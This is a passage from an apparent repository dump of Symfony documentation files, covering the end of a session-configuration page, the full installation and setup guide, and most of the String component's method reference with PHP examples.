https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <framework:config>\n                <framework:session storage-id=\"session.storage.php_bridge\"\n                    handler-id=\"session.storage.native_file\"\n                />\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->session()\n                ->storageFactoryId('session.storage.factory.php_bridge')\n                ->handlerId('session.storage.native_file')\n            ;\n        };\n\n.. note::\n\n    If the legacy application requires its own session save handler, do not\n    override this. Instead set ``handler_id: ~``. Note that a save handler\n    cannot be changed once the session has been started. If the application\n    starts the session before Symfony is initialized, the save handler will\n    have already been set. In this case, you will need ``handler_id: ~``.\n    Only override the save handler if you are sure the legacy application\n    can use the Symfony save handler without side effects and that the session\n    has not been started before Symfony is initialized.\n\n.. _`phpredis extension`: https://github.com/phpredis/phpredis\n.. _`DoctrineMongoDBBundle configuration`: https://symfony.com/doc/master/bundles/DoctrineMongoDBBundle/config.html\n.. _`MongoDB shell`: https://docs.mongodb.com/manual/mongo/\n.. _`php-encryption`: https://github.com/defuse/php-encryption\n"
        },
        {
          "name": "setup.rst",
          "type": "blob",
          "size": 12.3203125,
          "content": "Installing & Setting up the Symfony Framework\n=============================================\n\n.. admonition:: Screencast\n    :class: screencast\n\n    Do you prefer video tutorials? Check out the `Harmonious Development with Symfony`_\n    screencast series.\n\n.. _symfony-tech-requirements:\n\nTechnical Requirements\n----------------------\n\nBefore creating your first Symfony application you must:\n\n* Install PHP 8.2 or higher and these PHP extensions (which are installed and\n  enabled by default in most PHP 8 installations): `Ctype`_, `iconv`_,\n  `PCRE`_, `Session`_, `SimpleXML`_, and `Tokenizer`_;\n* `Install Composer`_, which is used to install PHP packages.\n\n.. _setup-symfony-cli:\n\nAlso, `install the Symfony CLI`_. This is optional, but it gives you a\nhelpful binary called ``symfony`` that provides all tools you need to\ndevelop and run your Symfony application locally.\n\nThe ``symfony`` binary also provides a tool to check if your computer meets all\nrequirements. Open your console terminal and run this command:\n\n.. code-block:: terminal\n\n    $ symfony check:requirements\n\n.. note::\n\n    The Symfony CLI is open source, and you can contribute to it in the\n    `symfony-cli/symfony-cli GitHub repository`_.\n\n.. _creating-symfony-applications:\n\nCreating Symfony Applications\n-----------------------------\n\nOpen your console terminal and run any of these commands to create a new Symfony\napplication:\n\n.. code-block:: terminal\n\n    # run this if you are building a traditional web application\n    $ symfony new my_project_directory --version=\"7.1.*\" --webapp\n\n    # run this if you are building a microservice, console application or API\n    $ symfony new my_project_directory --version=\"7.1.*\"\n\nThe only difference between these two commands is the number of packages\ninstalled by default. The ``--webapp`` option installs extra packages to give\nyou everything you need to build a web application.\n\nIf you're not using the Symfony binary, run these commands to create the new\nSymfony application using Composer:\n\n.. code-block:: terminal\n\n    # run this if you are building a traditional web application\n    $ composer create-project symfony/skeleton:\"7.1.*\" my_project_directory\n    $ cd my_project_directory\n    $ composer require webapp\n\n    # run this if you are building a microservice, console application or API\n    $ composer create-project symfony/skeleton:\"7.1.*\" my_project_directory\n\nNo matter which command you run to create the Symfony application. All of them\nwill create a new ``my_project_directory/`` directory, download some dependencies\ninto it and even generate the basic directories and files you'll need to get\nstarted. In other words, your new application is ready!\n\n.. note::\n\n    The project's cache and logs directory (by default, ``<project>/var/cache/``\n    and ``<project>/var/log/``) must be writable by the web server. If you have\n    any issue, read how to :doc:`set up permissions for Symfony applications </setup/file_permissions>`.\n\n.. _install-existing-app:\n\nSetting up an Existing Symfony Project\n--------------------------------------\n\nIn addition to creating new Symfony projects, you will also work on projects\nalready created by other developers. In that case, you only need to get the\nproject code and install the dependencies with Composer. Assuming your team uses\nGit, setup your project with the following commands:\n\n.. code-block:: terminal\n\n    # clone the project to download its contents\n    $ cd projects/\n    $ git clone ...\n\n    # make Composer install the project's dependencies into vendor/\n    $ cd my-project/\n    $ composer install\n\nYou'll probably also need to customize your :ref:`.env file <config-dot-env>`\nand do a few other project-specific tasks (e.g. creating a database). When\nworking on a existing Symfony application for the first time, it may be useful\nto run this command which displays information about the project:\n\n.. code-block:: terminal\n\n    $ php bin/console about\n\nRunning Symfony Applications\n----------------------------\n\nIn production, you should install a web server like Nginx or Apache and\n:doc:`configure it to run Symfony </setup/web_server_configuration>`. This\nmethod can also be used if you're not using the Symfony local web server for\ndevelopment.\n\n.. _symfony-binary-web-server:\n\nHowever for local development, the most convenient way of running Symfony is by\nusing the :doc:`local web server </setup/symfony_server>` provided by the\n``symfony`` binary. This local server provides among other things support for\nHTTP/2, concurrent requests, TLS/SSL and automatic generation of security\ncertificates.\n\nOpen your console terminal, move into your new project directory and start the\nlocal web server as follows:\n\n.. code-block:: terminal\n\n    $ cd my-project/\n    $ symfony server:start\n\nOpen your browser and navigate to ``http://localhost:8000/``. If everything is\nworking, you'll see a welcome page. Later, when you are finished working, stop\nthe server by pressing ``Ctrl+C`` from your terminal.\n\n.. tip::\n\n    The web server works with any PHP application, not only Symfony projects,\n    so it's a very useful generic development tool.\n\nSymfony Docker Integration\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you'd like to use Docker with Symfony, see :doc:`/setup/docker`.\n\n.. _symfony-flex:\n.. _flex-quick-intro:\n\nInstalling Packages\n-------------------\n\nA common practice when developing Symfony applications is to install packages\n(Symfony calls them :doc:`bundles </bundles>`) that provide ready-to-use\nfeatures. Packages usually require some setup before using them (editing some\nfile to enable the bundle, creating some file to add some initial config, etc.)\n\nMost of the time this setup can be automated and that's why Symfony includes\n`Symfony Flex`_, a tool to simplify the installation/removal of packages in\nSymfony applications. Technically speaking, Symfony Flex is a Composer plugin\nthat is installed by default when creating a new Symfony application and which\n**automates the most common tasks of Symfony applications**.\n\n.. tip::\n\n    You can also :doc:`add Symfony Flex to an existing project </setup/flex>`.\n\nSymfony Flex modifies the behavior of the ``require``, ``update``, and\n``remove`` Composer commands to provide advanced features. Consider the\nfollowing example:\n\n.. code-block:: terminal\n\n    $ cd my-project/\n    $ composer require logger\n\nIf you run that command in a Symfony application which doesn't use Flex, you'll\nsee a Composer error explaining that ``logger`` is not a valid package name.\nHowever, if the application has Symfony Flex installed, that command installs\nand enables all the packages needed to use the official Symfony logger.\n\n.. _recipes-description:\n\nThis is possible because lots of Symfony packages/bundles define **\"recipes\"**,\nwhich are a set of automated instructions to install and enable packages into\nSymfony applications. Flex keeps track of the recipes it installed in a\n``symfony.lock`` file, which must be committed to your code repository.\n\nSymfony Flex recipes are contributed by the community and they are stored in\ntwo public repositories:\n\n* `Main recipe repository`_, is a curated list of recipes for high quality and\n  maintained packages. Symfony Flex only looks in this repository by default.\n\n* `Contrib recipe repository`_, contains all the recipes created by the\n  community. All of them are guaranteed to work, but their associated packages\n  could be unmaintained. Symfony Flex will ask your permission before installing\n  any of these recipes.\n\nRead the `Symfony Recipes documentation`_ to learn everything about how to\ncreate recipes for your own packages.\n\n.. _symfony-packs:\n\nSymfony Packs\n~~~~~~~~~~~~~\n\nSometimes a single feature requires installing several packages and bundles.\nInstead of installing them individually, Symfony provides **packs**, which are\nComposer metapackages that include several dependencies.\n\nFor example, to add debugging features in your application, you can run the\n``composer require --dev debug`` command. This installs the ``symfony/debug-pack``,\nwhich in turn installs several packages like ``symfony/debug-bundle``,\n``symfony/monolog-bundle``, ``symfony/var-dumper``, etc.\n\nYou won't see the ``symfony/debug-pack`` dependency in your ``composer.json``,\nas Flex automatically unpacks the pack. This means that it only adds the real\npackages as dependencies (e.g. you will see a new ``symfony/var-dumper`` in\n``require-dev``).\n\n.. _security-checker:\n\nChecking Security Vulnerabilities\n---------------------------------\n\nThe ``symfony`` binary created when you installed the :ref:`Symfony CLI <setup-symfony-cli>`\nprovides a command to check whether your project's dependencies contain any known security\nvulnerability:\n\n.. code-block:: terminal\n\n    $ symfony check:security\n\nA good security practice is to execute this command regularly to be able to\nupdate or replace compromised dependencies as soon as possible. The security\ncheck is done locally by fetching the public `PHP security advisories database`_,\nso your ``composer.lock`` file is not sent on the network.\n\nThe ``check:security`` command terminates with a non-zero exit code if any of\nyour dependencies is affected by a known security vulnerability. This way you\ncan add it to your project build process and your continuous integration\nworkflows to make them fail when there are vulnerabilities.\n\n.. tip::\n\n    In continuous integration services you can check security vulnerabilities\n    using a different stand-alone project called `Local PHP Security Checker`_.\n    This is the same project used internally by ``check:security`` but much\n    smaller in size than the entire Symfony CLI.\n\nSymfony LTS Versions\n--------------------\n\nAccording to the :doc:`Symfony release process </contributing/community/releases>`,\n\"long-term support\" (or LTS for short) versions are published every two years.\nCheck out the `Symfony releases`_ to know which is the latest LTS version.\n\nBy default, the command that creates new Symfony applications uses the latest\nstable version. If you want to use an LTS version, add the ``--version`` option:\n\n.. code-block:: terminal\n\n    # use the most recent LTS version\n    $ symfony new my_project_directory --version=lts\n\n    # use the 'next' Symfony version to be released (still in development)\n    $ symfony new my_project_directory --version=next\n\n    # you can also select an exact specific Symfony version\n    $ symfony new my_project_directory --version=\"6.4.*\"\n\nThe ``lts`` and ``next`` shortcuts are only available when using Symfony to\ncreate new projects. If you use Composer, you need to tell the exact version:\n\n.. code-block:: terminal\n\n    $ composer create-project symfony/skeleton:\"6.4.*\" my_project_directory\n\nThe Symfony Demo application\n----------------------------\n\n`The Symfony Demo Application`_ is a fully-functional application that shows the\nrecommended way to develop Symfony applications. It's a great learning tool for\nSymfony newcomers and its code contains tons of comments and helpful notes.\n\nRun this command to create a new project based on the Symfony Demo application:\n\n.. code-block:: terminal\n\n    $ symfony new my_project_directory --demo\n\nStart Coding!\n-------------\n\nWith setup behind you, it's time to :doc:`Create your first page in Symfony </page_creation>`.\n\nLearn More\n----------\n\n.. toctree::\n    :maxdepth: 1\n    :glob:\n\n    setup/docker\n    setup/homestead\n    setup/web_server_configuration\n    setup/*\n\n.. _`Harmonious Development with Symfony`: https://symfonycasts.com/screencast/symfony\n.. _`Install Composer`: https://getcomposer.org/download/\n.. _`install the Symfony CLI`: https://symfony.com/download\n.. _`symfony-cli/symfony-cli GitHub repository`: https://github.com/symfony-cli/symfony-cli\n.. _`The Symfony Demo Application`: https://github.com/symfony/demo\n.. _`Symfony Flex`: https://github.com/symfony/flex\n.. _`PHP security advisories database`: https://github.com/FriendsOfPHP/security-advisories\n.. _`Local PHP Security Checker`: https://github.com/fabpot/local-php-security-checker\n.. _`Symfony releases`: https://symfony.com/releases\n.. _`Main recipe repository`: https://github.com/symfony/recipes\n.. _`Contrib recipe repository`: https://github.com/symfony/recipes-contrib\n.. _`Symfony Recipes documentation`: https://github.com/symfony/recipes/blob/master/README.rst\n.. _`iconv`: https://www.php.net/book.iconv\n.. _`Session`: https://www.php.net/book.session\n.. _`Ctype`: https://www.php.net/book.ctype\n.. _`Tokenizer`: https://www.php.net/book.tokenizer\n.. _`SimpleXML`: https://www.php.net/book.simplexml\n.. _`PCRE`: https://www.php.net/book.pcre\n"
        },
        {
          "name": "setup",
          "type": "tree",
          "content": null
        },
        {
          "name": "string.rst",
          "type": "blob",
          "size": 27.8154296875,
          "content": "Creating and Manipulating Strings\n=================================\n\nSymfony provides an object-oriented API to work with Unicode strings (as bytes,\ncode points and grapheme clusters). This API is available via the String component,\nwhich you must first install in your application:\n\n.. _installation:\n\n.. code-block:: terminal\n\n    $ composer require symfony/string\n\n.. include:: /components/require_autoload.rst.inc\n\nWhat is a String?\n-----------------\n\nYou can skip this section if you already know what a *\"code point\"* or a\n*\"grapheme cluster\"* are in the context of handling strings. Otherwise, read\nthis section to learn about the terminology used by this component.\n\nLanguages like English require a very limited set of characters and symbols to\ndisplay any content. Each string is a series of characters (letters or symbols)\nand they can be encoded even with the most limited standards (e.g. `ASCII`_).\n\nHowever, other languages require thousands of symbols to display their contents.\nThey need complex encoding standards such as `Unicode`_ and concepts like\n\"character\" no longer make sense. Instead, you have to deal with these terms:\n\n* `Code points`_: they are the atomic units of information. A string is a series\n  of code points. Each code point is a number whose meaning is given by the\n  `Unicode`_ standard. For example, the English letter ``A`` is the ``U+0041``\n  code point and the Japanese *kana* ``の`` is the ``U+306E`` code point.\n* `Grapheme clusters`_: they are a sequence of one or more code points which are\n  displayed as a single graphical unit. For example, the Spanish letter ``ñ`` is\n  a grapheme cluster that contains two code points: ``U+006E`` = ``n`` (*\"latin\n  small letter N\"*) + ``U+0303`` = ``◌̃`` (*\"combining tilde\"*).\n* Bytes: they are the actual information stored for the string contents. Each\n  code point can require one or more bytes of storage depending on the standard\n  being used (UTF-8, UTF-16, etc.).\n\nThe following image displays the bytes, code points and grapheme clusters for\nthe same word written in English (``hello``) and Hindi (``नमस्ते``):\n\n.. image:: /_images/components/string/bytes-points-graphemes.png\n    :alt: Each letter in \"hello\" is made up of one byte, one code point and one grapheme cluster. In the Hindi translation, the first two letters (\"नम\") take up three bytes, one code point and one grapheme cluster. The last letters (\"स्ते\") each take up six bytes, two code points and one grapheme cluster.\n\nUsage\n-----\n\nCreate a new object of type :class:`Symfony\\\\Component\\\\String\\\\ByteString`,\n:class:`Symfony\\\\Component\\\\String\\\\CodePointString` or\n:class:`Symfony\\\\Component\\\\String\\\\UnicodeString`, pass the string contents as\ntheir arguments and then use the object-oriented API to work with those strings::\n\n    use Symfony\\Component\\String\\UnicodeString;\n\n    $text = (new UnicodeString('This is a déjà-vu situation.'))\n        ->trimEnd('.')\n        ->replace('déjà-vu', 'jamais-vu')\n        ->append('!');\n    // $text = 'This is a jamais-vu situation!'\n\n    $content = new UnicodeString('नमस्ते दुनिया');\n    if ($content->ignoreCase()->startsWith('नमस्ते')) {\n        // ...\n    }\n\nMethod Reference\n----------------\n\nMethods to Create String Objects\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nFirst, you can create objects prepared to store strings as bytes, code points\nand grapheme clusters with the following classes::\n\n    use Symfony\\Component\\String\\ByteString;\n    use Symfony\\Component\\String\\CodePointString;\n    use Symfony\\Component\\String\\UnicodeString;\n\n    $foo = new ByteString('hello');\n    $bar = new CodePointString('hello');\n    // UnicodeString is the most commonly used class\n    $baz = new UnicodeString('hello');\n\nUse the ``wrap()`` static method to instantiate more than one string object::\n\n    $contents = ByteString::wrap(['hello', 'world']);        // $contents = ByteString[]\n    $contents = UnicodeString::wrap(['I', '❤️', 'Symfony']); // $contents = UnicodeString[]\n\n    // use the unwrap method to make the inverse conversion\n    $contents = UnicodeString::unwrap([\n        new UnicodeString('hello'), new UnicodeString('world'),\n    ]); // $contents = ['hello', 'world']\n\nIf you work with lots of String objects, consider using the shortcut functions\nto make your code more concise::\n\n    // the b() function creates byte strings\n    use function Symfony\\Component\\String\\b;\n\n    // both lines are equivalent\n    $foo = new ByteString('hello');\n    $foo = b('hello');\n\n    // the u() function creates Unicode strings\n    use function Symfony\\Component\\String\\u;\n\n    // both lines are equivalent\n    $foo = new UnicodeString('hello');\n    $foo = u('hello');\n\n    // the s() function creates a byte string or Unicode string\n    // depending on the given contents\n    use function Symfony\\Component\\String\\s;\n\n    // creates a ByteString object\n    $foo = s(\"\\xfe\\xff\");\n    // creates a UnicodeString object\n    $foo = s('अनुच्छेद');\n\nThere are also some specialized constructors::\n\n    // ByteString can create a random string of the given length\n    $foo = ByteString::fromRandom(12);\n    // by default, random strings use A-Za-z0-9 characters; you can restrict\n    // the characters to use with the second optional argument\n    $foo = ByteString::fromRandom(6, 'AEIOU0123456789');\n    $foo = ByteString::fromRandom(10, 'qwertyuiop');\n\n    // CodePointString and UnicodeString can create a string from code points\n    $foo = UnicodeString::fromCodePoints(0x928, 0x92E, 0x938, 0x94D, 0x924, 0x947);\n    // equivalent to: $foo = new UnicodeString('नमस्ते');\n\nMethods to Transform String Objects\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nEach string object can be transformed into the other two types of objects::\n\n    $foo = ByteString::fromRandom(12)->toCodePointString();\n    $foo = (new CodePointString('hello'))->toUnicodeString();\n    $foo = UnicodeString::fromCodePoints(0x68, 0x65, 0x6C, 0x6C, 0x6F)->toByteString();\n\n    // the optional $toEncoding argument defines the encoding of the target string\n    $foo = (new CodePointString('hello'))->toByteString('Windows-1252');\n    // the optional $fromEncoding argument defines the encoding of the original string\n    $foo = (new ByteString('さよなら'))->toCodePointString('ISO-2022-JP');\n\nIf the conversion is not possible for any reason, you'll get an\n:class:`Symfony\\\\Component\\\\String\\\\Exception\\\\InvalidArgumentException`.\n\nThere is also a method to get the bytes stored at some position::\n\n    // ('नमस्ते' bytes = [224, 164, 168, 224, 164, 174, 224, 164, 184,\n    //                  224, 165, 141, 224, 164, 164, 224, 165, 135])\n    b('नमस्ते')->bytesAt(0);   // [224]\n    u('नमस्ते')->bytesAt(0);   // [224, 164, 168]\n\n    b('नमस्ते')->bytesAt(1);   // [164]\n    u('नमस्ते')->bytesAt(1);   // [224, 164, 174]\n\n.. _methods-related-to-length-and-white-spaces:\n\nMethods Related to Length and Whitespace Characters\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n::\n\n    // returns the number of graphemes, code points or bytes of the given string\n    $word = 'नमस्ते';\n    (new ByteString($word))->length();      // 18 (bytes)\n    (new CodePointString($word))->length(); // 6 (code points)\n    (new UnicodeString($word))->length();   // 4 (graphemes)\n\n    // some symbols require double the width of others to represent them when using\n    // a monospaced font (e.g. in a console). This method returns the total width\n    // needed to represent the entire word\n    $word = 'नमस्ते';\n    (new ByteString($word))->width();      // 18\n    (new CodePointString($word))->width(); // 4\n    (new UnicodeString($word))->width();   // 4\n    // if the text contains multiple lines, it returns the max width of all lines\n    $text = \"<<<END\n    This is a\n    multiline text\n    END\";\n    u($text)->width(); // 14\n\n    // only returns TRUE if the string is exactly an empty string (not even whitespace)\n    u('hello world')->isEmpty();  // false\n    u('     ')->isEmpty();        // false\n    u('')->isEmpty();             // true\n\n    // removes all whitespace (' \\n\\r\\t\\x0C') from the start and end of the string and\n    // replaces two or more consecutive whitespace characters with a single space (' ') character\n    u(\"  \\n\\n   hello \\t   \\n\\r   world \\n    \\n\")->collapseWhitespace(); // 'hello world'\n\nMethods to Change Case\n~~~~~~~~~~~~~~~~~~~~~~\n\n::\n\n    // changes all graphemes/code points to lower case\n    u('FOO Bar Brİan')->lower();  // 'foo bar bri̇an'\n    // changes all graphemes/code points to lower case according to locale-specific case mappings\n    u('FOO Bar Brİan')->localeLower('en');  // 'foo bar bri̇an'\n    u('FOO Bar Brİan')->localeLower('lt');  // 'foo bar bri̇̇an'\n\n    // when dealing with different languages, uppercase/lowercase is not enough\n    // there are three cases (lower, upper, title), some characters have no case,\n    // case is context-sensitive and locale-sensitive, etc.\n    // this method returns a string that you can use in case-insensitive comparisons\n    u('FOO Bar')->folded();             // 'foo bar'\n    u('Die O\\'Brian Straße')->folded(); // \"die o'brian strasse\"\n\n    // changes all graphemes/code points to upper case\n    u('foo BAR bάz')->upper(); // 'FOO BAR BΆZ'\n    // changes all graphemes/code points to upper case according to locale-specific case mappings\n    u('foo BAR bάz')->localeUpper('en'); // 'FOO BAR BΆZ'\n    u('foo BAR bάz')->localeUpper('el'); // 'FOO BAR BAZ'\n\n    // changes all graphemes/code points to \"title case\"\n    u('foo ijssel')->title();               // 'Foo ijssel'\n    u('foo ijssel')->title(allWords: true); // 'Foo Ijssel'\n    // changes all graphemes/code points to \"title case\" according to locale-specific case mappings\n    u('foo ijssel')->localeTitle('en'); // 'Foo ijssel'\n    u('foo ijssel')->localeTitle('nl'); // 'Foo IJssel'\n\n    // changes all graphemes/code points to camelCase\n    u('Foo: Bar-baz.')->camel(); // 'fooBarBaz'\n    // changes all graphemes/code points to snake_case\n    u('Foo: Bar-baz.')->snake(); // 'foo_bar_baz'\n    // other cases can be achieved by chaining methods. E.g. PascalCase:\n    u('Foo: Bar-baz.')->camel()->title(); // 'FooBarBaz'\n\n.. versionadded:: 7.1\n\n    The ``localeLower()``, ``localeUpper()`` and ``localeTitle()`` methods were\n    introduced in Symfony 7.1.\n\nThe methods of all string classes are case-sensitive by default. You can perform\ncase-insensitive operations with the ``ignoreCase()`` method::\n\n    u('abc')->indexOf('B');               // null\n    u('abc')->ignoreCase()->indexOf('B'); // 1\n\nMethods to Append and Prepend\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n::\n\n    // adds the given content (one or more strings) at the beginning/end of the string\n    u('world')->prepend('hello');      // 'helloworld'\n    u('world')->prepend('hello', ' '); // 'hello world'\n\n    u('hello')->append('world');      // 'helloworld'\n    u('hello')->append(' ', 'world'); // 'hello world'\n\n    // adds the given content at the beginning of the string (or removes it) to\n    // make sure that the content starts exactly with that content\n    u('Name')->ensureStart('get');       // 'getName'\n    u('getName')->ensureStart('get');    // 'getName'\n    u('getgetName')->ensureStart('get'); // 'getName'\n    // this method is similar, but works on the end of the content instead of on the beginning\n    u('User')->ensureEnd('Controller');           // 'UserController'\n    u('UserController')->ensureEnd('Controller'); // 'UserController'\n    u('UserControllerController')->ensureEnd('Controller'); // 'UserController'\n\n    // returns the contents found before/after the first occurrence of the given string\n    u('hello world')->before('world');                  // 'hello '\n    u('hello world')->before('o');                      // 'hell'\n    u('hello world')->before('o', includeNeedle: true); // 'hello'\n\n    u('hello world')->after('hello');                  // ' world'\n    u('hello world')->after('o');                      // ' world'\n    u('hello world')->after('o', includeNeedle: true); // 'o world'\n\n    // returns the contents found before/after the last occurrence of the given string\n    u('hello world')->beforeLast('o');                      // 'hello w'\n    u('hello world')->beforeLast('o', includeNeedle: true); // 'hello wo'\n\n    u('hello world')->afterLast('o');                      // 'rld'\n    u('hello world')->afterLast('o', includeNeedle: true); // 'orld'\n\nMethods to Pad and Trim\n~~~~~~~~~~~~~~~~~~~~~~~\n\n::\n\n    // makes a string as long as the first argument by adding the given\n    // string at the beginning, end or both sides of the string\n    u(' Lorem Ipsum ')->padBoth(20, '-'); // '--- Lorem Ipsum ----'\n    u(' Lorem Ipsum')->padStart(20, '-'); // '-------- Lorem Ipsum'\n    u('Lorem Ipsum ')->padEnd(20, '-');   // 'Lorem Ipsum --------'\n\n    // repeats the given string the number of times passed as argument\n    u('_.')->repeat(10); // '_._._._._._._._._._.'\n\n    // removes the given characters (default: whitespace characters) from the beginning and end of a string\n    u('   Lorem Ipsum   ')->trim(); // 'Lorem Ipsum'\n    u('Lorem Ipsum   ')->trim('m'); // 'Lorem Ipsum   '\n    u('Lorem Ipsum')->trim('m');    // 'Lorem Ipsu'\n\n    u('   Lorem Ipsum   ')->trimStart(); // 'Lorem Ipsum   '\n    u('   Lorem Ipsum   ')->trimEnd();   // '   Lorem Ipsum'\n\n    // removes the given content from the start/end of the string\n    u('file-image-0001.png')->trimPrefix('file-');           // 'image-0001.png'\n    u('file-image-0001.png')->trimPrefix('image-');          // 'file-image-0001.png'\n    u('file-image-0001.png')->trimPrefix('file-image-');     // '0001.png'\n    u('template.html.twig')->trimSuffix('.html');            // 'template.html.twig'\n    u('template.html.twig')->trimSuffix('.twig');            // 'template.html'\n    u('template.html.twig')->trimSuffix('.html.twig');       // 'template'\n    // when passing an array of prefix/suffix, only the first one found is trimmed\n    u('file-image-0001.png')->trimPrefix(['file-', 'image-']); // 'image-0001.png'\n    u('template.html.twig')->trimSuffix(['.twig', '.html']);   // 'template.html'\n\nMethods to Search and Replace\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n::\n\n    // checks if the string starts/ends with the given string\n    u('https://symfony.com')->startsWith('https'); // true\n    u('report-1234.pdf')->endsWith('.pdf');        // true\n\n    // checks if the string contents are exactly the same as the given contents\n    u('foo')->equalsTo('foo'); // true\n\n    // checks if the string content match the given regular expression.\n    u('avatar-73647.png')->match('/avatar-(\\d+)\\.png/');\n    // result = ['avatar-73647.png', '73647', null]\n\n    // You can pass flags for preg_match() as second argument. If PREG_PATTERN_ORDER\n    // or PREG_SET_ORDER are passed, preg_match_all() will be used.\n    u('206-555-0100 and 800-555-1212')->match('/\\d{3}-\\d{3}-\\d{4}/', \\PREG_PATTERN_ORDER);\n    // result = [['206-555-0100', '800-555-1212']]\n\n    // checks if the string contains any of the other given strings\n    u('aeiou')->containsAny('a');                 // true\n    u('aeiou')->containsAny(['ab', 'efg']);       // false\n    u('aeiou')->containsAny(['eio', 'foo', 'z']); // true\n\n    // finds the position of the first occurrence of the given string\n    // (the second argument is the position where the search starts and negative\n    // values have the same meaning as in PHP functions)\n    u('abcdeabcde')->indexOf('c');     // 2\n    u('abcdeabcde')->indexOf('c', 2);  // 2\n    u('abcdeabcde')->indexOf('c', -4); // 7\n    u('abcdeabcde')->indexOf('eab');   // 4\n    u('abcdeabcde')->indexOf('k');     // null\n\n    // finds the position of the last occurrence of the given string\n    // (the second argument is the position where the search starts and negative\n    // values have the same meaning as in PHP functions)\n    u('abcdeabcde')->indexOfLast('c');     // 7\n    u('abcdeabcde')->indexOfLast('c', 2);  // 7\n    u('abcdeabcde')->indexOfLast('c', -4); // 2\n    u('abcdeabcde')->indexOfLast('eab');   // 4\n    u('abcdeabcde')->indexOfLast('k');     // null\n\n    // replaces all occurrences of the given string\n    u('http://symfony.com')->replace('http://', 'https://'); // 'https://symfony.com'\n    // replaces all occurrences of the given regular expression\n    u('(+1) 206-555-0100')->replaceMatches('/[^A-Za-z0-9]++/', ''); // '12065550100'\n    // you can pass a callable as the second argument to perform advanced replacements\n    u('123')->replaceMatches('/\\d/', function (string $match): string {\n        return '['.$match[0].']';\n    }); // result = '[1][2][3]'\n\nMethods to Join, Split, Truncate and Reverse\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n::\n\n    // uses the string as the \"glue\" to merge all the given strings\n    u(', ')->join(['foo', 'bar']); // 'foo, bar'\n\n    // breaks the string into pieces using the given delimiter\n    u('template_name.html.twig')->split('.');    // ['template_name', 'html', 'twig']\n    // you can set the maximum number of pieces as the second argument\n    u('template_name.html.twig')->split('.', 2); // ['template_name', 'html.twig']\n\n    // returns a substring which starts at the first argument and has the length of the\n    // second optional argument (negative values have the same meaning as in PHP functions)\n    u('Symfony is great')->slice(0, 7);  // 'Symfony'\n    u('Symfony is great')->slice(0, -6); // 'Symfony is'\n    u('Symfony is great')->slice(11);    // 'great'\n    u('Symfony is great')->slice(-5);    // 'great'\n\n    // reduces the string to the length given as argument (if it's longer)\n    u('Lorem Ipsum')->truncate(3);             // 'Lor'\n    u('Lorem Ipsum')->truncate(80);            // 'Lorem Ipsum'\n    // the second argument is the character(s) added when a string is cut\n    // (the total length includes the length of this character(s))\n    u('Lorem Ipsum')->truncate(8, '…');             // 'Lorem I…'\n    // if the third argument is false, the last word before the cut is kept\n    // even if that generates a string longer than the desired length\n    u('Lorem Ipsum')->truncate(8, '…', cut: false); // 'Lorem Ipsum'\n\n::\n\n    // breaks the string into lines of the given length\n    u('Lorem Ipsum')->wordwrap(4);                  // 'Lorem\\nIpsum'\n    // by default it breaks by white space; pass TRUE to break unconditionally\n    u('Lorem Ipsum')->wordwrap(4, \"\\n\", cut: true); // 'Lore\\nm\\nIpsu\\nm'\n\n    // replaces a portion of the string with the given contents:\n    // the second argument is the position where the replacement starts;\n    // the third argument is the number of graphemes/code points removed from the string\n    u('0123456789')->splice('xxx');       // 'xxx'\n    u('0123456789')->splice('xxx', 0, 2); // 'xxx23456789'\n    u('0123456789')->splice('xxx', 0, 6); // 'xxx6789'\n    u('0123456789')->splice('xxx', 6);    // '012345xxx'\n\n    // breaks the string into pieces of the length given as argument\n    u('0123456789')->chunk(3);  // ['012', '345', '678', '9']\n\n    // reverses the order of the string contents\n    u('foo bar')->reverse();  // 'rab oof'\n    u('さよなら')->reverse(); // 'らなよさ'\n\nMethods Added by ByteString\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThese methods are only available for ``ByteString`` objects::\n\n    // returns TRUE if the string contents are valid UTF-8 contents\n    b('Lorem Ipsum')->isUtf8(); // true\n    b(\"\\xc3\\x28\")->isUtf8();    // false\n\nMethods Added by CodePointString and UnicodeString\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThese methods are only available for ``CodePointString`` and ``UnicodeString``\nobjects::\n\n    // transliterates any string into the latin alphabet defined by the ASCII encoding\n    // (don't use this method to build a slugger because this component already provides\n    // a slugger, as explained later in this article)\n    u('नमस्ते')->ascii();    // 'namaste'\n    u('さよなら')->ascii(); // 'sayonara'\n    u('спасибо')->ascii(); // 'spasibo'\n\n    // returns an array with the code point or points stored at the given position\n    // (code points of 'नमस्ते' graphemes = [2344, 2350, 2360, 2340]\n    u('नमस्ते')->codePointsAt(0); // [2344]\n    u('नमस्ते')->codePointsAt(2); // [2360]\n\n`Unicode equivalence`_ is the specification by the Unicode standard that\ndifferent sequences of code points represent the same character. For example,\nthe Swedish letter ``å`` can be a single code point (``U+00E5`` = *\"latin small\nletter A with ring above\"*) or a sequence of two code points (``U+0061`` =\n*\"latin small letter A\"* + ``U+030A`` = *\"combining ring above\"*). The\n``normalize()`` method allows to pick the normalization mode::\n\n    // these encode the letter as a single code point: U+00E5\n    u('å')->normalize(UnicodeString::NFC);\n    u('å')->normalize(UnicodeString::NFKC);\n    // these encode the letter as two code points: U+0061 + U+030A\n    u('å')->normalize(UnicodeString::NFD);\n    u('å')->normalize(UnicodeString::NFKD);\n\nLazy-loaded Strings\n-------------------\n\nSometimes, creating a string with the methods presented in the previous sections\nis not optimal. For example, consider a hash value that requires certain\ncomputation to obtain and which you might end up not using it.\n\nIn those cases, it's better to use the :class:`Symfony\\\\Component\\\\String\\\\LazyString`\nclass that allows to store a string whose value is only generated when you need it::\n\n    use Symfony\\Component\\String\\LazyString;\n\n    $lazyString = LazyString::fromCallable(function (): string {\n        // Compute the string value...\n        $value = ...;\n\n        // Then return the final value\n        return $value;\n    